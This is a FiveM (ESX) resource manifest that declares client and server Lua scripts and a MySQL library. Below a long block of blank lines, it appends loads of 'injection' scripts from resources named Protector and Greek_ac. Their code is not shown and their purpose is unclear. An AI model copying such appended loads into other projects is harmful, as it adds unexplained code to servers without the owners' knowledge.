

resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

client_scripts {
	"@es_extended/locale.lua",
    "clienten.lua"
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	"server.lua",
	'@es_extended/locale.lua'
}













server_script "@Protector/Server/injection.lua"


client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"